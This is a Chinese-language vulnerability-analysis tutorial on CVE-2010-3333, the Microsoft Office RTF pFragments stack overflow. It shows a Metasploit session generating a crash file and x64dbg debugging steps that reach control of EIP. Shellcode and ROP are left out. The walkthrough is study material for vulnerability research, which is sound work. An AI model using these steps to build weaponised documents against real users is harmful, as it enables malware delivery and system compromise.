> 环境：windows7 with sp1
>
> 漏洞软件：Microsoft Office 2003
>
> 调试工具：x64dbg

&emsp;&emsp;<font size=2>这也是早期一个非常简单的栈溢出漏洞了，首先我们用metaspolit生成一个利用文件然后回溯到漏洞点吧。msf命令如下：</font></br>

```bash
msf5 > search cve-2010-3333

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank   Check  Description
   -  ----                                                    ---------------  ----   -----  -----------
   0  exploit/windows/fileformat/ms10_087_rtf_pfragments_bof  2010-11-09       great  No     MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)


msf5 > use 0
msf5 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) > info

       Name: MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)
     Module: exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
   Platform: Windows
       Arch:
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2010-11-09

Provided by:
  wushi of team509
  unknown
  jduck <jduck@metasploit.com>
  DJ Manila Ice, Vesh, CA

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   Microsoft Office 2002 SP3 English on Windows XP SP3 English
  2   Microsoft Office 2003 SP3 English on Windows XP SP3 English
  3   Microsoft Office 2007 SP0 English on Windows XP SP3 English
  4   Microsoft Office 2007 SP0 English on Windows Vista SP0 English
  5   Microsoft Office 2007 SP0 English on Windows 7 SP0 English
  6   Crash Target for Debugging
  
msf5 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) > set target 6
target => 6
msf5 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) > run

[*] Creating 'msf.rtf' file ...
[+] msf.rtf stored at /Users/fanda/.msf4/local/msf.rtf
msf5 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) >
```

&emsp;&emsp;<font size=2>然后打开Office 2003，然后用Office打开msf.rtf文件之前先用x64dbg附加上去（不懂为啥都喜欢用windbg，个人觉得调试用户态程序完全用不着），附上去了之后按F9继续运行，然后返回到Office界面打开msf的POC文件，这时候就会触发异常，x64dbg也会停下来到异常指令处：</font></br>

![第一次异常](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/第一次异常.png)

&emsp;&emsp;<font size=2>然后完了，看完了。这个漏洞就是这么简单，就是由于早期Office版本对rtf文件格式中的`\sn pFragments`属性没有检查长度导致的栈溢出。我们可以看到edi目标地址是指向栈的：</font></br>

![栈越界](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/栈越界.png)

![栈数据](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/栈数据.png)

&emsp;&emsp;<font size=2>而这个地址已经超出了栈的最大长度，越界访问了超出的映射地址。而超出部分的页面保护如下：</font></br>

![栈的映射](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/栈的映射.png)

&emsp;&emsp;<font size=2>是只可读的，无法写，因此报了非法访问异常。esi指向文件的`\sn pFragments`属性对应的值，因为没有长度检查，因此只要文件足够大，就可以往栈里写任意多的数据各种溢出各种越界都可以。原理就是这样，可以根据自己的意图构造ROP指令，甚至都不需要像上一个漏洞那样用到堆喷射。触发崩溃的RTF文件头部内容是这样的：</font></br>

![崩溃POC1](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/崩溃POC1.png)

&emsp;&emsp;<font size=2>触发非法访问的内容在这里：</font></br>

![崩溃部分POC](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/崩溃部分POC.png)

&emsp;&emsp;<font size=2>所以说是读入了相当多的数据淹没了栈。</font></br>

&emsp;&emsp;<font size=2>原理有些简单，但是不知道为啥msf生成的MessageBox不行，那我们手动修改POC劫持一次eip，打开POC触发断点：</font></br>

![POC文件大小段](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/POC文件大小段.png)

&emsp;&emsp;<font size=2>可以看到事实上ecx是`rep movsd`指令的循环次数，因为一次取四个字节，所以字节数对应POC文件中相应位置的0xc8ac（别忘了小端排序），Office默认这是文件大小，但是这是可以任意构造的，所以说对长度并没有进行实际意义上的检查。</font></br>

&emsp;&emsp;<font size=2>接下来我们试着去劫持eip，但最终目的不是为了getshell或者计算器之类的，这不在我们CVE踩坑系列的范畴内，对于msf生成的POC，我们可以看到即使改小了rtf的大小字段，Office仍然会触发异常然后崩溃：</font></br>

![修正POC大小](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/修正POC大小.png)

&emsp;&emsp;<font size=2>这一次死在了这里：</font></br>

![第二次异常](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/第二次异常.png)

&emsp;&emsp;<font size=2>edx是从文件里读出来的一个值，在基于`30F4CE50`lea了一次后当然会成为一个非法地址，那么怎么避免崩溃呢？当然是令edx为0啦。栈回溯一下，回到调用此函数的地方。看看edx被修改的地方：</font></br>

![栈回溯](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/栈回溯.png)

&emsp;&emsp;<font size=2>仔细看，edx被赋值为`dword ptr [ebp-0x10]`里的值，那么我们再次回溯`dword ptr [ebp-0x10]`的值什么时候被修改，往上看`call dword ptr ds:[eax+1C]`的一个参数就是`ebp-0x10`，在这里下断然后重新运行程序，步进去：</font></br>

![跟踪edx](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/跟踪edx.png)

&emsp;&emsp;<font size=2>这里edi就指向之前的`ebp-0x10`，esi指向POC里的某一段数据，这就好办了，我们就可以根据这段数据的偏移直接改为0，就能避免之前的异常崩溃了。在这里修改为0：</font></br>

![修正异常](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/修正异常.png)

&emsp;&emsp;<font size=2>重新运行后，我们发现又tm崩溃了。不过这次我们离成功不远了，因为我们可以看到eip被修改为了POC中的数据，这就意味着我们只需要找到特定偏移的数据修改为我们的想要的任意地址就可以劫持了，手动跟踪一下就能找到了，我只能说偏移在这里：</font></br>

![劫持点](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/劫持点.png)

&emsp;&emsp;<font size=2>可以看到成功劫持eip为aaaaaaaa了，那接下来ROP就自己玩吧，都是常规套路了。</font></br>

![最终结果](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-3333/screenshot/最终结果.png)